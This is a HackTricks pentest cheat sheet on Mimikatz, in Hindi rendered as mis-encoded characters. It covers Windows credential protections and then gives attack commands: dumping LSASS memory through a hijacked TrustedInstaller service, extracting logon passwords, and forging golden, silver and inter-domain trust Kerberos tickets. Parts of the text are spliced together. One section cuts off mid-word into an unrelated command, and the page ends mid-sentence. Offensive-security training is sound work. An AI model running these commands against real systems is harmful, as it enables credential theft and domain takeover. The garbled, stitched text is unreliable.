# Mimikatz

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреЛ рдкреАрдбреАрдПрдл рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдж рдкреАрдПрд╕ рдлреИрдорд┐рд▓реА**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**рдПрдирдПрдлрдЯреА**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ рджреЗрдЦреЗрдВ
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ рдкреАрдПрд╕ рдФрд░ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд░реЗрдкреЛ** (https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ**ред

</details>

**рдпрд╣ рдкреГрд╖реНрда [adsecurity.org](https://adsecurity.org/?page\_id=1821) рд╕реЗ рдЖрдзрд╛рд░рд┐рдд рд╣реИ**ред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдореВрд▓ рджреЗрдЦреЗрдВ!

## рдореЗрдореЛрд░реА рдореЗрдВ рдПрд▓рдПрдо рдФрд░ рд╕рд╛рдл-рдЯреЗрдХреНрд╕реНрдЯ

Windows 8.1 рдФрд░ Windows Server 2012 R2 рд╕реЗ рдЖрдЧреЗ, рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдЪреЛрд░реА рд╕реЗ рдмрдЪрд╛рд╡ рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЙрдкрд╛рдп рд▓рд╛рдЧреВ рдХрд┐рдП рдЧрдП рд╣реИрдВ:

- **рдПрд▓рдПрдо рд╣реИрд╢ рдФрд░ рд╕рд╛рдл-рдЯреЗрдХреНрд╕реНрдЯ рдкрд╛рд╕рд╡рд░реНрдб** рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдореЗрдореЛрд░реА рдореЗрдВ рдирд╣реАрдВ рд╕реНрдЯреЛрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд╕реЗрдЯрд┐рдВрдЧ, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ рдХреЛ рдПрдХ DWORD рдорд╛рди `0` рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рддрд╛рдХрд┐ рдбрд╛рдЗрдЬреЗрд╕реНрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдЕрдХреНрд╖рдо рдХрд░реЗрдВ, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ "рд╕рд╛рдл-рдЯреЗрдХреНрд╕реНрдЯ" рдкрд╛рд╕рд╡рд░реНрдб LSASS рдореЗрдВ рдХреИрд╢ рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВред

- **LSA рд╕рдВрд░рдХреНрд╖рд╛** рдХреЛ рдкреНрд░рд╛рд╡рдзрд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕реНрдерд╛рдиреАрдп рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рд╛рдзрд┐рдХрд░рдг (LSA) рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЕрдирдзрд┐рдХреГрдд рдореЗрдореЛрд░реА рдкрдарди рдФрд░ рдХреЛрдб рдкреНрд░рд╡реЗрд╢ рд╕реЗ рдмрдЪрд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдЗрд╕реЗ LSASS рдХреЛ рд╕рдВрд░рдХреНрд╖рд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд┐рд╣реНрдирд┐рдд рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред LSA рд╕рдВрд░рдХреНрд╖рд╛ рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
1. _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ рдкрд░ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ `RunAsPPL` рдХреЛ `dword:00000001` рдкрд░ рд╕реЗрдЯ рдХрд░рдирд╛ред
2. рдкреНрд░рдмрдВрдзрд┐рдд рдЙрдкрдХрд░рдгреЛрдВ рдкрд░ рдпрд╣ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдкрд░рд┐рд╡рд░реНрддрди рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рдореВрд╣ рдиреАрддрд┐ рд╡рд╕реНрддреБ (GPO) рдХрд╛ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдХрд░рдирд╛ред

рдЗрди рд╕реБрд░рдХреНрд╖рд╛рдУрдВ рдХреЗ рдмрд╛рд╡рдЬреВрдж, Mimikatz рдЬреИрд╕реЗ рдЙрдкрдХрд░рдг LSA рд╕рдВрд░рдХреНрд╖рд╛ рдХреЛ рдирд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡рд┐рд╢реЗрд╖ рдбреНрд░рд╛рдЗрд╡рд░реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдРрд╕реЗ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреЛ рдЗрд╡реЗрдВрдЯ рд▓реЙрдЧ рдореЗрдВ рд▓рд┐рдЦрд╛ рдЬрд╛рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИред

### SeDebugPrivilege рд╣рдЯрд╛рдиреЗ рдХрд╛ рд╡рд┐рд░реЛрдз рдХрд░рдирд╛

рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЗ рдкрд╛рд╕ рд╕рд╛рдорд╛рдиреНрдпрдд: SeDebugPrivilege рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рдЙрдиреНрд╣реЗрдВ рдХрд╛рд░реНрдпрдХреНрд░рдореЛрдВ рдХреЛ рдбреАрдмрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЗрд╕ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЛ рдЕрдирдзрд┐рдХреГрдд рдореЗрдореЛрд░реА рдбрдВрдкреНрд╕ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рд╣рдорд▓рд╛рд╡рд╛рд░реЛрдВ рджреНрд╡рд╛рд░рд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдореЗрдореЛрд░реА рд╕реЗ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рддрдХрдиреАрдХ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЛ рд╣рдЯрд╛рдиреЗ рдХреЗ рдмрд╛рд╡рдЬреВрдж, TrustedInstaller рдЦрд╛рддрд╛ рдПрдХ рдХрд╕реНрдЯрдорд╛рдЗрдЬрд╝реНрдб рд╕реЗрд╡рд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдореЗрдореЛрд░реА рдбрдВрдк рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
рдпрд╣ `lsass.exe` рдореЗрдореЛрд░реА рдХреЛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдбрдВрдк рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдлрд┐рд░ рдПрдХ рдЕрдиреНрдп рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд╡рд┐рд╢реНрд▓реЗрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдирд┐рдХрд╛рд▓реЗ рдЬрд╛ рд╕рдХреЗрдВ:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz рд╡рд┐рдХрд▓реНрдк

Mimikatz рдореЗрдВ рдЗрд╡реЗрдВрдЯ рд▓реЙрдЧ рдЯреИрдореНрдкрд░рд┐рдВрдЧ рдореЗрдВ рджреЛ рдореБрдЦреНрдп рдХреНрд░рд┐рдпрд╛рдПрдБ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ: рдЗрд╡реЗрдВрдЯ рд▓реЙрдЧреНрд╕ рдХреЛ рд╕рд╛рдл рдХрд░рдирд╛ рдФрд░ рдирдП рдЗрд╡реЗрдВрдЯреНрд╕ рдХрд╛ рд▓реЙрдЧрд┐рдВрдЧ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╡
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### рд╕рд┐рд▓реНрд╡рд░ рдЯрд┐рдХрдЯ рдирд┐рд░реНрдорд╛рдг

рд╕рд┐рд▓реНрд╡рд░ рдЯрд┐рдХрдЯ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕реЗрд╡рд╛рдУрдВ рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдореБрдЦреНрдп рдХрдорд╛рдВрдб рдФрд░ рдкреИрд░рд╛рдореАрдЯрд░:

- рдХрдорд╛рдВрдб: рдЧреЛрд▓реНрдбрди рдЯрд┐рдХрдЯ рдХреЗ рд╕рдорд╛рди рд╣реИ рд▓реЗрдХрд┐рди рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рд▓рдХреНрд╖реНрдп рдмрдирд╛рддрд╛ рд╣реИред
- рдкреИрд░рд╛рдореАрдЯрд░:
- `/service`: рд▓рдХреНрд╖реНрдп рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛ (рдЬреИрд╕реЗ, cifs, http)ред
- рдЧреЛрд▓реНрдбрди рдЯрд┐рдХрдЯ рдХреЗ рд╕рдорд╛рди рдЕрдиреНрдп рдкреИрд░рд╛рдореАрдЯрд░ред

рдЙрджрд╛рд╣рд░рдг:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### рд╡рд┐рд╢реНрд╡рд╛рд╕ рдЯрд┐рдХрдЯ рдирд┐рд░реНрдорд╛рдг

рд╡рд┐рд╢реНрд╡рд╛рд╕ рдЯрд┐рдХрдЯ рдХреЛ рд╡рд┐рд╢реНрд╡рд╛рд╕ рд╕рдВрдмрдВрдзреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЛрдореЗрди рдХреЗ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдореБрдЦреНрдп рдХрдорд╛рдВрдб рдФрд░ рдкреИрд░рд╛рдореАрдЯрд░:

- рдХрдорд╛рдВрдб: рдЧреЛрд▓реНрдбрди рдЯрд┐рдХрдЯ рдХреЗ рд▓рд┐рдП рд╕рдорд╛рди, рд▓реЗрдХрд┐рди рд╡рд┐рд╢реНрд╡рд╛рд╕ рд╕рдВрдмрдВрдзреЛрдВ рдХреЗ рд▓рд┐рдПред
- рдкреИрд░рд╛рдореАрдЯрд░:
- `/target`: рд▓рдХреНрд╖рд┐рдд рдбреЛрдореЗрди рдХрд╛ FQDNред
- `/rc4`: рд╡рд┐рд╢реНрд╡рд╛рд╕ рдЦрд╛рддреЗ рдХреЗ NTLM рд╣реИрд╢ред

рдЙрджрд╛рд╣рд░рдг:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### рдЕрддрд┐рд░рд┐рдХреНрдд рдХреЗрд░рдмреЗрд░реЛрд╕ рдХрдорд╛рдВрдб

- **рдЯрд┐рдХрдЯ рд╕реВрдЪреАрдХрд░рдг**:
- рдХрдорд╛рдВрдб: `kerberos::list`
- рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рддреНрд░ рдХреЗ рд▓рд┐рдП рд╕рднреА рдХреЗрд░рдмреЗрд░реЛрд╕ рдЯрд┐рдХрдЯ рд╕реВрдЪреАрдмрджреНрдз рдХрд░рддрд╛ рд╣реИред

- **рдХреИрд╢ рдкрд╛рд╕**:
- рдХрдорд╛рдВрдб: `kerberos::ptc`
- рдХреИрд╢ рдлрд╝рд╛рдЗрд▓ рд╕реЗ рдХреЗрд░рдмреЗрд░реЛрд╕ рдЯрд┐рдХрдЯ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИред
- рдЙрджрд╛рд╣рд░рдг: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **рдЯрд┐рдХрдЯ рдкрд╛рд╕**:
- рдХрдорд╛рдВрдб: `kerberos::ptt`
- рджреВрд╕рд░реЗ рд╕рддреНрд░ рдореЗрдВ рдХреЗрд░рдмреЗрд░реЛрд╕ рдЯрд┐рдХрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
- рдЙрджрд╛рд╣рд░рдг: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **рдЯрд┐рдХрдЯ рд╕рдлрд╛рдИ**:
- рдХрдорд╛рдВрдб: `kerberos::purge`
- рд╕рддреНрд░ рд╕реЗ рд╕рднреА рдХреЗрд░рдмреЗрд░реЛрд╕ рдЯрд┐рдХрдЯ рдХреЛ рд╕рд╛рдл рдХрд░рддрд╛ рд╣реИред
- рд╕рдВрдШрд░реНрд╖ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЯрд┐рдХрдЯ рдорд╛рдирд┐рдкреБрд▓реЗрд╢рди рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдЙрдкрдпреЛрдЧреАред


### рд╕рдХреНрд░рд┐рдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

- **DCShadow**: рдПрдХ рдорд╢реАрди рдХреЛ рдЕрд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рдПрдХ рдбреАрд╕реА рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдбреА рдСрдмреНрдЬ
